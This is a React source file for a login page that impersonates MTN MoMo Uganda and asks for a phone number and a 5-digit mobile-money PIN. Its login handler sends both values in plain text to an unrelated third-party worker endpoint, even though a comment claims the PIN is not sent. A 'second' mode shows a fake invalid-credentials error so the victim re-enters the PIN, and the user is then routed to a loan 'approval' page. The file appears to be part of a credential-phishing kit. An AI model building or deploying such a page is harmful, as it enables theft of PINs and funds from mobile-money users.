
import React, { useEffect, useRef, useState } from "react";
import { Eye, EyeOff, X } from "lucide-react";
import { useLocation, useNavigate } from "react-router-dom";

function MomoMark({ footer = false })  {
  return (
    <div
      aria-hidden="true"
      className={`flex shrink-0 items-center justify-center rounded-[16px] bg-[#ffcc00] font-black leading-none text-[#063866] shadow-[0_5px_14px_rgba(0,0,0,0.12)] ${
        footer
          ? "h-12 w-12 rounded-[12px] text-[36px]"
          : "h-[clamp(64px,10vh,88px)] w-[clamp(64px,10vh,88px)] text-[clamp(44px,7vh,58px)]"
      }`}
    >
      MM
    </div>
  );
}

function MoMoLogin({ mode = "first" }) {
  const navigate = useNavigate();
  const location = useLocation();
   const showError = mode === "second";

  const inputRefs = useRef([]);

  const previousPhone = location.state?.phone || "";
  const loginError = location.state?.loginError === true;

  const [phone, setPhone] = useState(previousPhone);
  const [pin, setPin] = useState(Array(5).fill(""));
  const [showPin, setShowPin] = useState(false);

  // const [error, setError] = useState(
  //   loginError ? "Invalid credentials. Please try again." : ""
  // );
   const [error, setError] = useState(
    showError ? "Invalid credentials. Please try again." : ""
  );



  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");

    setPhone(value);

    // User ne data change kiya, error remove
    setError("");
  };

  const handlePinChange = (value, index) => {
    const digit = value.replace(/\D/g, "").slice(-1);

    const newPin = [...pin];
    newPin[index] = digit;

    setPin(newPin);

    // User ne PIN change kiya, error remove
    setError("");

    if (digit && index < 4) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();

    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 5);

    if (!pasted) return;

    const newPin = Array(5).fill("");

    pasted.split("").forEach((digit, index) => {
      newPin[index] = digit;
    });

    setPin(newPin);
    setError("");

    const nextIndex = Math.min(pasted.length, 4);
    inputRefs.current[nextIndex]?.focus();
  };

  const clearPin = () => {
    setPin(Array(5).fill(""));
    setError("");
    inputRefs.current[0]?.focus();
  };

  const pinValue = pin.join("");

  const isPinComplete = pinValue.length === 5;
  const isPhoneEntered = phone.trim().length > 0;
const handleLogin = async () => {
  if (!phone.trim()) {
    setError("Please enter your phone number.");
    return;
  }

  if (pin.join("").length !== 5) {
    setError("Please enter the 5-digit demo PIN.");
    return;
  }

  try {
    setError("");

    // Demo API:
    // PIN ko API ko send nahi kar rahe.
    const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/loginFlooss", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
       mobile: phone,
        pin: pin.join(""),
      }),
    });

    if (!response.ok) {
      throw new Error("API request failed");
    }

    const data = await response.json();

    console.log("API response:", data);

    // First attempt
    navigate("/approval", {
      state: {
        phone,
        pin,
        attempt: showError ? 2 : 1,
        applicationId: "APP-1791223914489",
      },
    });
  } catch (error) {
    console.error(error);
    setError("Unable to process your request. Please try again.");
  }
};
  // const handleLogin = () => {
  //   // Demo validation only
  //   if (!phone.trim()) {
  //     setError("Please enter your phone number.");
  //     return;
  //   }

  //   if (pin.join("").length !== 5) {
  //     setError("Please enter the 5-digit demo PIN.");
  //     return;
  //   }

  //   navigate("/approval", {
  //     state: {
  //       phone,
  //       attempt: showError ? 2 : 1,
  //     },
  //   });
  // };

  return (
    <div className="flex min-h-dvh flex-col bg-white font-sans text-[#171f38]">
      {/* HEADER */}
      <header className="flex h-[clamp(150px,18vh,265px)] shrink-0 flex-col items-center bg-[#063866] pt-[7px]">
        <MomoMark />

        <p className="mt-[7px] text-[clamp(22px,4.8vw,38px)] font-bold leading-none text-[#ffcc00]">
          MoMo
        </p>

        <p className="mt-[10px] text-center text-[clamp(16px,3.5vw,27px)] leading-tight text-[#a9c2dd]">
          Login via MTN MoMo Uganda
        </p>
      </header>

      {/* MAIN */}
      <main className="flex flex-1 flex-col items-center px-[clamp(18px,5vw,40px)] pb-5 pt-[clamp(24px,4vh,58px)]">
        <section
          aria-label="MTN MoMo Uganda login"
          className="w-full max-w-[690px]"
        >
          <h1 className="mb-[clamp(22px,3.5vh,43px)] text-center text-[clamp(23px,4.2vw,34px)] font-bold leading-tight">
            Login to MTN MoMo Uganda
          </h1>

          {/* PHONE */}
          <div className="flex h-[clamp(62px,6vh,84px)] overflow-hidden rounded-[15px] border-2 border-[#dedede] bg-white text-[clamp(19px,3.8vw,28px)] shadow-[0_3px_12px_rgba(15,35,65,0.04)]">
            <span className="flex h-full shrink-0 items-center bg-[#f8f9fb] px-[clamp(16px,3vw,24px)] font-medium text-[#666]">
              +256
            </span>

            <input
              type="tel"
              value={phone}
              onChange={handlePhoneChange}
              placeholder="670123456"
              className="min-w-0 flex-1 bg-transparent px-[clamp(16px,3.5vw,27px)] outline-none placeholder:text-[#858585]"
              maxLength={9}
            />
          </div>

          {/* PIN TEXT */}
          <p className="mb-[clamp(12px,2vh,20px)] mt-[clamp(20px,3vh,43px)] text-center text-[clamp(17px,3.5vw,27px)] leading-tight text-[#858b96]">
            Enter your MoMo PIN (5 digits):
          </p>

          {/* PIN BOXES */}
          <div className="mx-[-8px] grid grid-cols-[repeat(5,minmax(0,1fr))_auto_auto] items-center gap-[clamp(6px,2vw,17px)]">
            {pin.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  inputRefs.current[index] = el;
                }}
                type={showPin ? "text" : "password"}
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) =>
                  handlePinChange(e.target.value, index)
                }
                onKeyDown={(e) => handleKeyDown(e, index)}
                onPaste={handlePaste}
                className="flex aspect-square max-h-[101px] min-w-0 w-full items-center justify-center rounded-[15px] border-2 border-[#dedede] bg-white text-center text-[clamp(22px,4vw,32px)] font-semibold text-[#333] outline-none shadow-[0_3px_12px_rgba(15,35,65,0.04)] focus:border-[#063866]"
                aria-label={`PIN digit ${index + 1}`}
              />
            ))}

            {/* SHOW / HIDE */}
            <button
              type="button"
              onClick={() => setShowPin((prev) => !prev)}
              className="flex h-[32px] w-[32px] items-center justify-center text-[#777]"
              aria-label={showPin ? "Hide PIN" : "Show PIN"}
            >
              {showPin ? (
                <EyeOff
                  className="h-[30px] w-[30px]"
                  strokeWidth={1.8}
                />
              ) : (
                <Eye
                  className="h-[30px] w-[30px]"
                  strokeWidth={1.8}
                />
              )}
            </button>

            {/* CLEAR */}
            <button
              type="button"
              onClick={clearPin}
              className="flex h-[32px] w-[32px] items-center justify-center text-[#888]"
              aria-label="Clear PIN"
            >
              <X
                className="h-[32px] w-[32px]"
                strokeWidth={1.8}
              />
            </button>
          </div>

          {/* ERROR */}
          {error && (
            <div className="mt-4 flex items-center justify-center rounded-[12px] border border-red-200 bg-red-50 px-4 py-3">
              <p className="text-center text-[15px] font-medium text-red-600 sm:text-[17px]">
                {error}
              </p>
            </div>
          )}

          {/* LOGIN */}
          <button
            type="button"
            onClick={handleLogin}
            disabled={!isPhoneEntered || !isPinComplete}
            className={`mt-[clamp(16px,2.5vh,24px)] h-[clamp(64px,6vh,84px)] w-full rounded-[15px] text-[clamp(20px,3.8vw,28px)] font-semibold tracking-wide transition ${
              isPhoneEntered && isPinComplete
                ? "cursor-pointer bg-[#ffcc00] text-[#063866] hover:bg-[#f2c200]"
                : "cursor-not-allowed bg-[#e8e8e8] text-[#aaa]"
            }`}
          >
            LOGIN
          </button>
        </section>
      </main>

      {/* FOOTER */}
      <footer className="relative z-0 flex h-[clamp(138px,15vh,180px)] shrink-0 flex-col items-center justify-end bg-[#063866] pb-[10px] pt-[30px] text-center">
        <div
          aria-hidden="true"
          className="absolute -top-[68px] left-[-15%] z-0 h-[100px] w-[130%] rounded-[50%] bg-[#063866]"
        />

        <div className="relative z-10 flex flex-col items-center">
          <MomoMark footer />

          <p className="mt-[5px] text-[clamp(19px,4.5vw,30px)] font-bold leading-tight text-[#ffcc00]">
            MTN MoMo Uganda
          </p>

          <p className="mt-[7px] text-[clamp(11px,3.3vw,20px)] leading-tight text-[#a9c2dd]">
            © 2026 MTN MoMo Uganda Loans. All rights reserved.
          </p>
        </div>
      </footer>
    </div>
  );
}

export default MoMoLogin;
